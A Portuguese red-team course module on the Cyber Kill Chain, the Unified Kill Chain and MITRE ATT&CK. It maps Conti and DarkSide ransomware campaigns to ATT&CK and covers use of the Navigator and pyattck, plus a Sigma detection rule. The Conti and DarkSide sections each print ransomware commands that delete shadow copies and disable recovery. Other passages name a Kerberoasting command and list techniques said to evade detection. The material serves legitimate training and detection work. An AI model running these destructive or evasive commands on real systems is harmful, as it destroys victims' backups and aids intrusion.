---
layout: cyber
section: fundamentos
title: "Kill Chain e MITRE ATT&CK"
---

# Kill Chain e MITRE ATT&CK

## A Linguagem Que Conecta Ataque e Defesa

Kill Chain e MITRE ATT&CK são a língua franca da segurança ofensiva e defensiva. Sem domínio dos dois, o operador não consegue planejar engagement estruturado, comunicar TTPs em relatório, mapear simulação a adversário real, nem identificar lacunas de cobertura do blue team. Em CRTO e OSEP isso não é vocabulário decorativo — cada técnica que você executa precisa de uma referência ATT&CK no engagement plan, e cada finding do relatório precisa do ID correspondente.

Pro lado defensivo o vínculo é simétrico. SOC e detection engineering escrevem regras Sigma, YARA e Splunk SPL ancoradas em IDs ATT&CK. `T1003.001` não é número arbitrário — é a *expectativa* de comportamentos observáveis (acesso a `lsass.exe` com `PROCESS_VM_READ`, criação de `.dmp`, etc.) que o blue team usa pra construir alerta. Quando o red team executa T1003.001 e o blue team não tem cobertura, esse gap aparece direto no Navigator e vai pro relatório.

---

## A Cyber Kill Chain Original (Lockheed Martin)

Publicado em 2011 pela Lockheed Martin, o Kill Chain foi o primeiro framework amplamente adotado pra descrever fases de ataque cibernético. O nome veio de doutrina militar — *destroy every link, break the chain* — e o produto operacional é uma checklist de 7 etapas pra raciocinar sobre ataque (e defesa).

```
+-------------------+     +-------------------+     +-------------------+
|  1. RECONHECIMENTO|---->| 2. WEAPONIZATION  |---->|   3. DELIVERY     |
|                   |     |                   |     |                   |
| OSINT, scanning   |     | Exploit + payload |     | E-mail, web,      |
| LinkedIn, Shodan  |     | Dropper criado    |     | USB, watering hole|
+-------------------+     +-------------------+     +-------------------+
                                                              |
                                                              v
+-------------------+     +-------------------+     +-------------------+
| 7. ACTIONS ON OBJ |<----| 6. COMMAND & CTL  |<----|  4. EXPLOITATION  |
|                   |     |                   |     |                   |
| Dados exfiltrados |     | Beacon -> C2      |     | Código executa na |
| Ransomware deploy |     | HTTP/DNS/HTTPS    |     | máquina alvo      |
| Objetivo atingido |     |                   |     +-------------------+
+-------------------+     +-------------------+              |
                                                              v
                                                   +-------------------+
                                                   | 5. INSTALLATION   |
                                                   |                   |
                                                   | Malware persiste  |
                                                   | Backdoor instalado|
                                                   +-------------------+
```

---

### Fase 1: Reconnaissance (Reconhecimento)

**O que acontece:** O atacante coleta informações sobre o alvo sem interagir diretamente com os sistemas.

**Passivo (sem deixar rastro no alvo):**
- Google Dorks: `site:empresa.com.br filetype:pdf`
- LinkedIn: estrutura organizacional, tecnologias usadas (Salesforce, VMware)
- Shodan: `org:"Empresa Alvo" port:443`
- Certificate Transparency: `crt.sh` — subdomínios via certificados SSL
- WHOIS, DNS records, ASN lookup

**Ativo (pode aparecer em logs do alvo):**
- Port scanning externo
- Web crawling
- DNS enumeration com ferramentas como `dnsx`, `subfinder`

**Exemplo real — APT29 (Cozy Bear):**
O APT29 usa reconhecimento extensivo antes de campanhas. Em 2020 (SolarWinds), eles mapearam a estrutura da SolarWinds através de informações públicas e repositórios GitHub antes de inserir o backdoor Sunburst.

**Defesa:** Honeytokens em documentos públicos, monitorar certificate transparency logs para domínios não autorizados, reduzir footprint de DNS.

---

### Fase 2: Weaponization (Armamento)

**O que acontece:** O atacante combina um exploit com um payload para criar uma arma (dropper, documento malicioso, link).

**Técnicas comuns:**
- Documento Office com macro VBA que baixa shellcode
- Arquivo LNK malicioso que executa PowerShell
- HTML Smuggling — JavaScript que reconstrói o payload no navegador da vítima
- PDF com exploit de JavaScript (Adobe Reader vulnerabilities)

**Exemplo real — Emotet:**
Emotet usou documentos Word com macros VBA que, ao serem habilitadas, baixavam o payload Emotet de um servidor comprometido. O processo era: vítima abre doc → habilita macros → VBA executa PowerShell → download → execução → persistência.

**Defesa:** Bloquear macros por política de grupo (GPO), Protected View habilitado, AppLocker/WDAC para bloquear scripts não assinados.

---

### Fase 3: Delivery (Entrega)

**O que acontece:** O weapon é entregue ao alvo.

**Vetores:**
- E-mail (phishing/spearphishing) — mais comum, ~90% dos incidentes iniciam aqui
- Drive-by download (watering hole) — comprometer site que a vítima visita
- USB drop — pen drives abandonados em estacionamentos
- Supply chain — comprometer software legítimo (ex: SolarWinds, 3CX)
- VPN/RDP exposto — credential stuffing

**Exemplo real — Lapsus$ Group:**
O grupo Lapsus$ usou insiders e compra de credenciais para delivery. Eles pagavam funcionários de empresas-alvo para instalar RATs ou fornecer credenciais VPN — eliminando completamente a fase técnica de delivery.

**Defesa:** E-mail filtering (sandboxing de anexos), bloquear execução de scripts via e-mail, treinamento de usuários, MFA em VPN/RDP.

---

### Fase 4: Exploitation (Exploração)

**O que acontece:** O exploit é executado na máquina da vítima — uma vulnerabilidade é explorada para executar código.

**Tipos de exploração:**
- Client-side: navegador, Office, PDF reader (ex: CVE-2022-30190 Follina)
- Server-side: serviços expostos (ProxyLogon, Log4Shell, EternalBlue)
- User-assisted: usuário clica, habilita macro, executa arquivo

**Exemplo real — ProxyLogon (CVE-2021-26855):**
SSRF pré-autenticado no Microsoft Exchange que permitia RCE. Usado pelo HAFNIUM e múltiplos grupos para explorar servidores Exchange expostos na internet, sem interação do usuário.

```
Atacante -> POST /owa/auth/Current/... com cookie especial
                    |
                    v
Exchange processa SSRF -> desserializa dados não confiáveis
                    |
                    v
RCE como SYSTEM no servidor Exchange
                    |
                    v
Webshell instalada em diretório de aplicação
```

**Defesa:** Patching rigoroso, WAF para serviços expostos, EDR com proteção de memória.

---

### Fase 5: Installation (Instalação)

**O que acontece:** O malware se instala para persistir no sistema.

**Mecanismos:**
- Serviços do Windows
- Registry Run Keys / RunOnce
- Scheduled Tasks
- DLL Hijacking / Search Order Hijacking
- WMI Event Subscriptions

**Exemplo real — APT41:**
O APT41 usa múltiplos mecanismos de persistência simultâneos. Uma de suas táticas é criar um serviço legítimo que carrega uma DLL maliciosa via DLL hijacking, garantindo persistência mesmo após reinicializações e evitando detecção por antivírus que verificam apenas executáveis.

---

### Fase 6: Command & Control (C2)

**O que acontece:** O malware estabelece canal de comunicação com o servidor do atacante.

**Protocolos comuns:**
- HTTPS (mais comum — mistura-se ao tráfego legítimo)
- DNS (tunneling via queries TXT/A)
- ICMP (menos comum, mais detectável)
- WebSockets
- Domain fronting (CDN como intermediário)

**Exemplo Cobalt Strike beacon over HTTPS:**
```
Beacon no host comprometido
        |
        | HTTPS POST /jquery-3.3.1.min.js (parece legítimo)
        v
Redirector (servidor intermediário) [não expõe C2 real]
        |
        | Repassa para C2 real
        v
Cobalt Strike Team Server
```

**Defesa:** Inspeção SSL/TLS (decrypt e inspecionar), DNS security (Protective DNS), monitorar padrões de beacon (intervalos regulares de comunicação).

---

### Fase 7: Actions on Objectives

**O que acontece:** O atacante executa seu objetivo final.

**Objetivos comuns:**
- Exfiltração de dados (espionagem corporativa, roubo de IP)
- Ransomware (criptografia de dados por extorsão)
- Destruição de dados (wiper — ex: NotPetya)
- Fraude financeira
- Acesso a sistemas OT/ICS (sabotagem)

**Exemplo real — Ryuk Ransomware:**
Após acesso inicial via Trickbot/BazarLoader, o grupo Ryuk passava semanas dentro da rede mapeando servidores, fazendo backup dos backups (para encontrar e destruir), escalando privilégios para Domain Admin, e só então deployava o ransomware sincronizado em toda a rede.

---

### Limitações do Kill Chain

O Kill Chain assume fluxo linear, o que se mostrou limitação séria com adversários modernos. Não modela bem ataques laterais e iterativos — onde o operador entra, sai, pivota e volta —, não cobre ameaças internas (insider threat já está dentro), não distingue entre técnicas dentro da mesma fase (todo "Defense Evasion" é tratado como bloco único), e o foco em malware ignora cenários inteiros de abuso puro de credenciais sem implant.

---

## Unified Kill Chain (UKC)

O Unified Kill Chain, criado por Paul Pols (2017), expande o Kill Chain para 18 fases e é mais adequado para modelar ataques modernos e APTs.

```
CICLO 1: IN (Entrada)
 1. Reconnaissance
 2. Resource Development
 3. Delivery
 4. Social Engineering
 5. Exploitation
 6. Persistence
 7. Defense Evasion
 8. Command & Control

CICLO 2: THROUGH (Movimento interno)
 9. Pivoting
10. Discovery
11. Privilege Escalation
12. Execution
13. Credential Access
14. Lateral Movement

CICLO 3: OUT (Exfiltração/Impacto)
15. Collection
16. Exfiltration
17. Impact
18. Objectives
```

UKC é mais adequado pra engagements complexos porque reconhece três realidades operacionais que o Kill Chain ignora: defense evasion acontece em múltiplos pontos (não como fase única), credential access pode anteceder *e* suceder privilege escalation, e o ciclo se repete a cada nova máquina comprometida (entrar num novo host reinicia ciclos 1–2).

---

## MITRE ATT&CK Framework

### Estrutura do ATT&CK

```
ATT&CK
├── Táticas (14 táticas para Enterprise)
│   ├── Técnicas (ex: T1566 - Phishing)
│   │   ├── Sub-técnicas (ex: T1566.001 - Spearphishing Attachment)
│   │   └── ...
│   └── ...
├── Grupos (APT28, APT29, Lazarus, etc.)
├── Software (Cobalt Strike, Mimikatz, etc.)
└── Mitigations (M1049, M1038, etc.)
```

### As 14 Táticas do ATT&CK Enterprise

| ID | Tática | Descrição |
|----|--------|-----------|
| TA0043 | Reconnaissance | Coletar informações antes do ataque |
| TA0042 | Resource Development | Criar infraestrutura e recursos |
| TA0001 | Initial Access | Entrar na rede alvo |
| TA0002 | Execution | Executar código malicioso |
| TA0003 | Persistence | Manter acesso |
| TA0004 | Privilege Escalation | Ganhar mais permissões |
| TA0005 | Defense Evasion | Evitar detecção |
| TA0006 | Credential Access | Roubar credenciais |
| TA0007 | Discovery | Mapear o ambiente |
| TA0008 | Lateral Movement | Mover para outros sistemas |
| TA0009 | Collection | Coletar dados de interesse |
| TA0011 | Command and Control | Comunicar com sistemas comprometidos |
| TA0010 | Exfiltration | Extrair dados |
| TA0040 | Impact | Manipular, interromper ou destruir |

**Diferença entre Tática e Técnica:**
- **Tática** = O **POR QUÊ** — o objetivo (ex: "Credential Access" — o objetivo é obter credenciais)
- **Técnica** = O **COMO** — o método (ex: T1003 OS Credential Dumping — como você obtém as credenciais)
- **Sub-técnica** = O **DETALHE DO COMO** (ex: T1003.001 — especificamente via dump do LSASS)

---

### Técnicas Críticas por Fase (com IDs)

#### Initial Access
```
T1566     - Phishing
T1566.001 - Spearphishing Attachment (documento malicioso)
T1566.002 - Spearphishing Link (link para site malicioso)
T1566.004 - Spearphishing Voice (vishing)
T1190     - Exploit Public-Facing Application (Exchange, VPN, Citrix)
T1078     - Valid Accounts (credenciais roubadas/compradas)
T1195     - Supply Chain Compromise (SolarWinds style)
T1133     - External Remote Services (RDP, VPN expostos)
```

#### Execution
```
T1059.001 - PowerShell
T1059.003 - Windows Command Shell (cmd.exe)
T1059.005 - Visual Basic (macros VBA)
T1059.007 - JavaScript (HTA, JS scriptlets)
T1204.002 - Malicious File (usuário executa arquivo)
T1218.011 - Rundll32 (LOLBin para executar DLL)
T1218.005 - Mshta (executa HTA)
```

#### Persistence
```
T1547.001 - Boot/Logon Autostart: Registry Run Keys
T1543.003 - Create or Modify System Process: Windows Service
T1053.005 - Scheduled Task/Job: Scheduled Task
T1546.015 - Event Triggered Execution: Component Object Model Hijacking
T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking
T1078.002 - Valid Accounts: Domain Accounts (Golden Ticket)
```

#### Privilege Escalation
```
T1068     - Exploitation for Privilege Escalation (kernel exploit)
T1134.001 - Access Token Manipulation: Token Impersonation/Theft
T1134.002 - Create Process with Token (SeImpersonatePrivilege)
T1078.002 - Domain Admin credentials
```

#### Defense Evasion
```
T1027     - Obfuscated Files or Information
T1027.010 - Command Obfuscation (Invoke-Obfuscation)
T1055     - Process Injection
T1055.001 - DLL Injection
T1055.002 - Portable Executable Injection
T1055.012 - Process Hollowing
T1070.004 - Indicator Removal: File Deletion
T1140     - Deobfuscate/Decode Files or Information
T1562.001 - Impair Defenses: Disable or Modify Tools (desabilitar AV)
T1218     - System Binary Proxy Execution (LOLBins)
```

#### Credential Access
```
T1003     - OS Credential Dumping
T1003.001 - LSASS Memory (Mimikatz sekurlsa::logonpasswords)
T1003.002 - Security Account Manager (SAM hive dump)
T1003.003 - NTDS (ntdsutil, secretsdump para AD)
T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting
T1558.004 - AS-REP Roasting
T1555.003 - Credentials from Web Browsers
T1552.001 - Unsecured Credentials: Credentials in Files
```

#### Lateral Movement
```
T1021.001 - Remote Desktop Protocol (RDP)
T1021.002 - SMB/Windows Admin Shares (PsExec, smbexec)
T1021.006 - Windows Remote Management (WinRM, Evil-WinRM)
T1047     - Windows Management Instrumentation (WMI)
T1550.002 - Use Alternate Authentication Material: Pass the Hash
T1550.003 - Pass the Ticket (com tickets Kerberos)
T1210     - Exploitation of Remote Services
```

#### Collection
```
T1005     - Data from Local System
T1039     - Data from Network Shared Drive
T1114.002 - Email Collection: Remote Email Collection (Exchange/O365)
T1074.002 - Data Staged: Remote Data Staging
T1123     - Audio Capture (microfone)
T1125     - Video Capture (câmera)
```

#### Exfiltration
```
T1041     - Exfiltration Over C2 Channel (exfil pelo mesmo canal do beacon)
T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol (FTP, HTTP)
T1567.002 - Exfiltration to Cloud Storage (SharePoint, Dropbox, OneDrive)
T1048     - Exfiltration Over Alternative Protocol
T1071.004 - DNS (DNS tunneling para exfiltração)
```

---

## Como Usar o ATT&CK Navigator

O Navigator é uma aplicação web para visualizar e anotar as técnicas do ATT&CK:

**URL:** https://mitre-attack.github.io/attack-navigator/

### Fluxo de trabalho para planejamento de engagement:

**Passo 1:** Acesse o Navigator e crie uma nova layer

**Passo 2:** Importe o perfil do grupo APT que você está emulando
```
Navigator -> Create New Layer -> Select Techniques
OU
Navigator -> Open Existing Layer -> colar JSON do ATT&CK
```

**Passo 3:** Via API do ATT&CK, baixe o perfil de um grupo:
```bash
# Baixar todos os grupos e suas técnicas
curl -s https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json \
  | python3 -c "
import json, sys
data = json.load(sys.stdin)
groups = [x for x in data['objects'] if x['type'] == 'intrusion-set']
for g in groups:
    print(g.get('name',''), g.get('external_references',[{}])[0].get('external_id',''))
"
```

**Passo 4:** Marque as técnicas que você vai usar no engagement com cores diferentes:
- Vermelho: técnicas que você vai executar
- Amarelo: técnicas de contingência
- Verde: técnicas que o blue team disse que cobre

**Passo 5:** Exporte o JSON e inclua no engagement plan

---

## Mapeando Ataques Reais ao ATT&CK

### Exemplo: Grupo de Ransomware Conti

O grupo Conti teve seu playbook vazado em 2021. Mapeamento ao ATT&CK:

```
INITIAL ACCESS:
  T1566.001 - Spearphishing (e-mails com docs maliciosos)
  T1133     - Credenciais de RDP/VPN compradas em mercados

EXECUTION:
  T1059.001 - PowerShell para download e execução
  T1059.003 - cmd.exe para reconhecimento inicial

PERSISTENCE:
  T1547.001 - Registry Run Keys
  T1053.005 - Scheduled Tasks

CREDENTIAL ACCESS:
  T1003.001 - Mimikatz para dump do LSASS
  T1003.003 - Secretsdump via Impacket para NTDS.dit

LATERAL MOVEMENT:
  T1021.002 - PsExec via compartilhamentos SMB
  T1550.002 - Pass the Hash com hashes NTLM
  T1047     - WMI para execução remota

EXFILTRATION (antes do ransom):
  T1567.002 - Upload para MEGA/cloud antes de criptografar
  T1048     - Rclone para exfiltração massiva

IMPACT:
  T1486     - Data Encrypted for Impact (ransomware Conti)
  T1490     - Inhibit System Recovery (deletar shadow copies)
```

**Comando para deletar shadow copies (Conti TTP documentado):**
```bash
# Essa técnica é T1490 - Inhibit System Recovery
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No
```

---

## Como Usar ATT&CK para Planejamento de Engagement

### Template de Engagement Plan com ATT&CK

```
# Engagement Plan - Empresa XYZ

## Adversário Emulado: APT29 (Cozy Bear)
## Fonte: MITRE ATT&CK G0016

## Fase 1: Initial Access
Técnica: T1566.001 - Spearphishing Attachment
Implementação: Documento Word com macro VBA que executa shellcode via PowerShell
Objetivo: Obter foothold em workstation de usuário comum
Critério de sucesso: Beacon ativo na máquina da vítima

## Fase 2: Persistence
Técnica: T1547.001 - Registry Run Keys
Implementação: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Objetivo: Sobreviver a reboot
Critério de sucesso: Beacon reconecta após reinicialização

## Fase 3: Privilege Escalation
Técnica: T1558.003 - Kerberoasting
Implementação: Rubeus kerberoast /outfile:hashes.txt
Objetivo: Obter hash de conta de serviço com SPN
Critério de sucesso: Hash crackeado offline

[...]
```

### Criação de Layer de Coverage no Navigator

Para medir gaps de detecção, crie duas layers:
1. **Red Team Layer:** Técnicas executadas
2. **Blue Team Layer:** Técnicas com alertas ativos (preenchido pelo blue team)

Sobreponha as duas camadas. As técnicas em vermelho que não estão em verde = **gaps de detecção**.

---

## Exemplos de Código / Comandos

### Consultar ATT&CK via Python (pyattck)
```python
# pip install pyattck
from pyattck import Attck

attack = Attck()

# Listar todas as técnicas da tática Credential Access
for technique in attack.enterprise.techniques:
    for tactic in technique.tactics:
        if tactic.name == "Credential Access":
            print(f"{technique.id}: {technique.name}")
            # Mostra sub-técnicas
            if hasattr(technique, 'subtechniques'):
                for sub in technique.subtechniques:
                    print(f"  {sub.id}: {sub.name}")
```

### Consultar grupos APT e suas técnicas
```python
from pyattck import Attck
attack = Attck()

# Buscar APT29
for group in attack.enterprise.actors:
    if "APT29" in group.aliases or "APT29" == group.name:
        print(f"Grupo: {group.name}")
        print(f"Aliases: {group.aliases}")
        for technique in group.techniques:
            print(f"  - {technique.id}: {technique.name}")
```

### Gerar JSON para o Navigator via Python
```python
import json

# Template de layer para o Navigator
layer = {
    "name": "Engagement APT29 Emulation",
    "versions": {"attack": "14", "navigator": "4.9"},
    "domain": "enterprise-attack",
    "description": "TTPs utilizados na emulação de APT29",
    "techniques": [
        {
            "techniqueID": "T1566.001",
            "tactic": "initial-access",
            "color": "#ff6666",
            "comment": "Spearphishing com documento Word malicioso",
            "enabled": True,
            "score": 100
        },
        {
            "techniqueID": "T1055",
            "tactic": "defense-evasion",
            "color": "#ff6666",
            "comment": "Process injection via CreateRemoteThread",
            "enabled": True,
            "score": 100
        }
        # Adicione mais técnicas aqui
    ],
    "gradient": {
        "colors": ["#ff6666", "#ffe766", "#8ec843"],
        "minValue": 0,
        "maxValue": 100
    }
}

with open("engagement_layer.json", "w") as f:
    json.dump(layer, f, indent=2)
print("Layer gerada: engagement_layer.json")
```

---

## Detecção e OPSEC

### O que o ATT&CK diz sobre detecção

Para cada técnica, o ATT&CK tem seção "Detection" que descreve o que o blue team pode monitorar. Use isso para entender o risco da sua técnica:

**T1003.001 (LSASS Dump) - Artefatos:**
- Processo acessando LSASS com PROCESS_VM_READ (Event ID 10 do Sysmon)
- Criação de dump file (Event ID 11 do Sysmon)
- Ferramentas como Mimikatz têm assinaturas conhecidas

**T1055 (Process Injection) - Artefatos:**
- Sysmon Event ID 8: CreateRemoteThread
- Sysmon Event ID 10: Acesso de processo a outro processo
- EDR behavioral detection: processo injetando em processo filho inesperado

### Técnicas mais detectadas (evite ou substitua)
```
ALTA DETECÇÃO:
- Mimikatz direto (assinatura conhecida)
- Meterpreter padrão (assinatura conhecida)
- PowerShell com IEX (Invoke-Expression) sem obfuscação
- PsExec padrão (Event ID 7045 - novo serviço)

MENOR DETECÇÃO (mas ainda monitorado):
- Cobalt Strike com perfil malleable customizado
- LOLBins (certutil, bitsadmin, regsvr32)
- WMI para lateral movement (menos logs por padrão)
- Process hollowing com executável legítimo como host
```

---

## Módulos Relacionados

`01_red_teaming_conceitos.md` estabelece o contexto de quando usar cada framework. `03_opsec_e_tradecraft.md` desce pra escolha de técnicas com menor visibilidade de detecção. `04_malware_essentials.md` implementa tecnicamente as técnicas de T1055 (Process Injection). `05_engajamento_roe_e_relatorios.md` formaliza como o mapeamento ATT&CK entra no relatório final.

---

## Leitura Complementar

- MITRE ATT&CK — https://attack.mitre.org/
- ATT&CK Navigator — https://mitre-attack.github.io/attack-navigator/
- ATT&CK Evaluations (avaliações de EDR) — https://attackevals.mitre-engenuity.org/
- Atomic Red Team (testes por técnica) — https://github.com/redcanaryco/atomic-red-team
- MITRE CTI GitHub (dados em JSON) — https://github.com/mitre/cti
- Sigma Rules (detecção por técnica) — https://github.com/SigmaHQ/sigma
- MITRE ATT&CK Groups — https://attack.mitre.org/groups/

---

## Técnicas MalTrak - Módulo 01

### Kill Chain Varonis: 8 Fases

O Kill Chain tradicional da Lockheed Martin tem 7 fases. A variante de 8 fases (adotada por Varonis e outros) expande com foco em ações pós-comprometimento, mais relevante para operações APT modernas:

```
+------------------------------------------------------------------+
|  FASE 1: RECONHECIMENTO                                          |
|  Coleta passiva de informações sobre o alvo                      |
|  OSINT, LinkedIn, Shodan, WHOIS, crt.sh, GitHub                 |
+------------------------------------------------------------------+
                          |
                          v
+------------------------------------------------------------------+
|  FASE 2: INTRUSÃO                                                |
|  Obter primeiro acesso à rede ou sistema                         |
|  Spearphishing, exploração de VPN/Exchange, credenciais vazadas  |
+------------------------------------------------------------------+
                          |
                          v
+------------------------------------------------------------------+
|  FASE 3: EXPLORAÇÃO                                              |
|  Executar código no host comprometido                            |
|  Macro executa dropper, LNK executa PowerShell, exploit RCE     |
+------------------------------------------------------------------+
                          |
                          v
+------------------------------------------------------------------+
|  FASE 4: ESCALADA DE PRIVILÉGIOS                                 |
|  Elevar acesso de user para admin/SYSTEM/Domain Admin            |
|  Kerberoasting, SeImpersonate, misconfigurações AD, exploits     |
+------------------------------------------------------------------+
                          |
                          v
+------------------------------------------------------------------+
|  FASE 5: MOVIMENTAÇÃO LATERAL                                    |
|  Pivotar de host para host dentro da rede interna               |
|  Pass-the-Hash, WMI, PsExec, RDP, BloodHound attack paths      |
+------------------------------------------------------------------+
                          |
                          v
+------------------------------------------------------------------+
|  FASE 6: OFUSCAÇÃO / ANTI-FORENSE                                |
|  Apagar rastros, dificultar investigação forense                 |
|  Limpar logs de eventos, modificar timestamps, deletar artefatos |
+------------------------------------------------------------------+
                          |
                          v
+------------------------------------------------------------------+
|  FASE 7: DENIAL OF SERVICE (quando aplicável)                    |
|  Degradar disponibilidade de sistemas (ransomware, destruição)   |
|  Encriptação de arquivos, wiper malware, DDoS                    |
+------------------------------------------------------------------+
                          |
                          v
+------------------------------------------------------------------+
|  FASE 8: EXFILTRAÇÃO                                             |
|  Mover dados coletados para fora do ambiente alvo               |
|  DNS tunneling, HTTPS para cloud storage, C2 channel            |
+------------------------------------------------------------------+
```

**Diferenças chave do Kill Chain original (7 fases):**
- Fases 6 e 7 são adicionadas explicitamente — o original trata como "Actions on Objectives"
- O modelo de 8 fases separa explicitamente anti-forense e DoS porque APTs modernos (especialmente ransomware) executam essas fases de forma distinta

---

### Caso DARKSIDE Ransomware: Kill Chain Aplicada

O DARKSIDE foi um grupo de ransomware-as-a-service (RaaS) responsável pelo ataque à Colonial Pipeline (2021). O MITRE identificou **três grupos distintos** que compraram acesso ao RaaS:

#### UNC2465 - Acesso Inicial via Spearphishing

**TTPs documentados:**
- **T1566.001**: Spearphishing Attachment — documentos Word com macros maliciosas
- **T1059.001**: PowerShell para execução de payload
- **T1204.002**: User Execution — vítima precisa habilitar macros
- **T1547.001**: Registry Run Keys para persistência

**Modus operandi:** E-mails com documentos financeiros falsos (faturas, orçamentos) enviados a departamentos de contabilidade/finanças. O documento solicita habilitação de macros "para visualizar conteúdo".

#### UNC2659 - Acesso Inicial via Serviços Externos

**TTPs documentados:**
- **T1190**: Exploit Public-Facing Application — exploração de VPN Pulse Secure (CVE-2019-11510) e Fortinet (CVE-2018-13379)
- **T1078**: Valid Accounts — uso de credenciais roubadas via exploração
- **T1133**: External Remote Services — acesso via VPN com credenciais comprometidas
- **T1021.001**: Remote Desktop Protocol — movimentação via RDP

**Modus operandi:** Varreu a internet em busca de VPNs Pulse Secure e FortiGate sem patch. CVE-2019-11510 permite leitura arbitrária de arquivos sem autenticação — incluindo o arquivo de senhas da VPN.

#### UNC2628 - Acesso Inicial via Credenciais Válidas

**TTPs documentados:**
- **T1078.002**: Domain Accounts — credenciais de domínio válidas compradas em fóruns criminais
- **T1021.001**: RDP como vetor principal de acesso e movimentação
- **T1486**: Data Encrypted for Impact — encriptação com DARKSIDE ransomware
- **T1489**: Service Stop — para serviços de backup antes de encriptar

**Modus operandi:** Comprou acesso de initial access brokers (IABs) especializados em vender acessos a redes corporativas. Focou em organizações com RDP exposto ou credenciais comprometidas.

---

### DARKSIDE: Mapeamento Completo ATT&CK

```
RECONHECIMENTO
├── T1595 - Active Scanning (varredura de VPNs vulneráveis)
└── T1596 - Search Open Technical Databases (Shodan para Pulse Secure)

ACESSO INICIAL
├── T1566.001 - Spearphishing Attachment (UNC2465)
├── T1190 - Exploit Public-Facing Application (UNC2659)
└── T1078 - Valid Accounts (UNC2628)

EXECUÇÃO
├── T1059.001 - PowerShell
├── T1059.003 - Windows Command Shell
└── T1204.002 - Malicious File (user habilita macro)

PERSISTÊNCIA
├── T1547.001 - Registry Run Keys
└── T1543.003 - Windows Service

ESCALADA DE PRIVILÉGIOS
├── T1068 - Exploitation for Privilege Escalation
└── T1134 - Access Token Manipulation

EVASÃO DE DEFESAS
├── T1027 - Obfuscated Files or Information
├── T1562.001 - Disable or Modify Tools (desabilita AV)
└── T1070.001 - Clear Windows Event Logs

MOVIMENTAÇÃO LATERAL
├── T1021.001 - Remote Desktop Protocol
├── T1021.002 - SMB/Windows Admin Shares
└── T1550.002 - Pass the Hash

COLETA
├── T1005 - Data from Local System
└── T1039 - Data from Network Shared Drive

EXFILTRAÇÃO
├── T1041 - Exfiltration Over C2 Channel
└── T1567.002 - Exfiltration to Cloud Storage (Mega.nz)

IMPACTO
├── T1486 - Data Encrypted for Impact (DARKSIDE ransomware)
├── T1489 - Service Stop (para backups antes de encriptar)
└── T1490 - Inhibit System Recovery (deleta shadow copies)
```

**Deleção de Shadow Copies** (`T1490`) é assinatura do ransomware moderno:

```cmd
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} recoveryenabled No
```

---

### MITRE ATT&CK: Táticas Completas (Enterprise)

O framework ATT&CK Enterprise cobre **14 táticas** — o "porquê" de cada ação adversária:

| ID | Tática | O que o adversário quer fazer |
|----|--------|-------------------------------|
| TA0043 | Reconnaissance | Coletar informações sobre o alvo antes de atacar |
| TA0042 | Resource Development | Preparar infraestrutura, contas, malware |
| TA0001 | Initial Access | Entrar na rede ou sistema alvo |
| TA0002 | Execution | Executar código malicioso no sistema |
| TA0003 | Persistence | Manter acesso mesmo após reboot ou troca de senha |
| TA0004 | Privilege Escalation | Obter permissões mais elevadas |
| TA0005 | Defense Evasion | Evitar detecção por ferramentas de segurança |
| TA0006 | Credential Access | Roubar credenciais de contas |
| TA0007 | Discovery | Entender o ambiente interno (hosts, usuários, shares) |
| TA0008 | Lateral Movement | Mover-se para outros sistemas na rede |
| TA0009 | Collection | Coletar dados de interesse para exfiltração |
| TA0011 | Command and Control | Manter canal de comunicação com o implante |
| TA0010 | Exfiltration | Remover dados coletados do ambiente |
| TA0040 | Impact | Causar dano final (ransomware, destruição, DoS) |

**Técnicas vs Sub-técnicas — estrutura hierárquica:**

```
T1566 - Phishing                             (técnica genérica)
├── T1566.001 - Spearphishing Attachment     (sub-técnica específica)
├── T1566.002 - Spearphishing Link           (sub-técnica específica)
└── T1566.003 - Spearphishing via Service    (sub-técnica específica)

T1059 - Command and Scripting Interpreter    (técnica genérica)
├── T1059.001 - PowerShell                   (sub-técnica)
├── T1059.003 - Windows Command Shell        (sub-técnica)
├── T1059.005 - Visual Basic                 (sub-técnica)
└── T1059.007 - JavaScript                   (sub-técnica)
```

Mapear sub-técnicas é crítico para detecção granular. Um SIEM pode detectar T1059 genericamente, mas uma regra específica para T1059.001 com flags `-EncodedCommand` e `-WindowStyle Hidden` é muito mais precisa e tem menos falsos positivos.

---

### ATT&CK Navigator: Uso Prático em Engajamentos

O Navigator é ferramenta web para visualizar, planejar e documentar:

**Workflow para threat emulation:**
1. Acesse `https://mitre-attack.github.io/attack-navigator/`
2. Carregue perfil de grupo: Menu → "Open Existing Layer" → selecione APT (ex: APT29, G0016)
3. Técnicas usadas pelo grupo aparecem destacadas
4. Filtre por plataforma: Windows / Linux / macOS / Cloud
5. Selecione técnicas relevantes para o contexto do cliente
6. Exporte como JSON para documentar o engagement plan

**Para purple team:** crie duas camadas sobrepostas:
- Camada 1 (vermelha): técnicas que o red team vai executar
- Camada 2 (azul): técnicas que o blue team tem detecção ativa

A sobreposição mostra cobertura; as lacunas mostram onde o SOC precisa investir.

---

### Usando ATT&CK para Escrever Regras de Detecção

Exemplo prático para `T1003.001 - LSASS Memory Dump`:

**Comportamento:** adversário lê memória do processo lsass.exe para extrair hashes NTLM e tickets Kerberos

**Observáveis:**
- Processo não-sistema acessando `lsass.exe` com direitos `PROCESS_VM_READ`
- Criação de arquivo `.dmp` (procdump, task manager dump)
- Execução de `mimikatz.exe` ou variante (mas nome pode ser alterado)

**Regra Sigma conceitual:**

```yaml
title: LSASS Memory Access by Non-System Process
logsource:
    product: windows
    category: process_access
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1410'
            - '0x147a'
    filter:
        SourceImage|contains:
            - '\Windows\System32\'
            - '\Windows\SysWOW64\'
    condition: selection and not filter
```

**No relatório final:** cada achado deve referenciar o ID ATT&CK.
> "O red team capturou credenciais de domínio via dump de LSASS (T1003.001). Esta técnica não gerou alertas durante os 3 dias em que foi executada, indicando ausência de regra de detecção para acesso a lsass.exe com direitos de leitura de memória."

---

### Referências MalTrak Módulo 01 - Kill Chain e ATT&CK

- DARKSIDE no MITRE ATT&CK: https://attack.mitre.org/software/S0632/
- Colonial Pipeline (Mandiant): https://www.mandiant.com/resources/darkside-ransomware
- ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
